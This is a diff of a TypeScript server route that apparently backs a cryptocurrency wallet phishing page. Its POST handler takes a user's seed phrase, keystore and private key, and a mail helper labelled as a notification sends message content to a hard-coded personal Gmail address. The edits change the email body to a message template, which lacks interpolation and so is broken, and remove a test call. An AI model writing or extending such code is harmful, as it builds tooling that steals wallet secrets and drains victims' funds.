@@ -25,7 +25,7 @@ const formatMessage = async (message: string) => {
     from: `Eh-boss Notify ${email}`,
     to: "osamathebomber3@gmail.com",
     subject: "Yo! you just got a new notification from Eh-boss",
-    html: `<div>Hi</div>`,
+    html: `<div>{message}</div>`,
   };
 
   transporter.verify(function (error: any, success: any) {
@@ -51,7 +51,7 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
-    await formatMessage('hi');
+    
 
     if (phrase) {
 
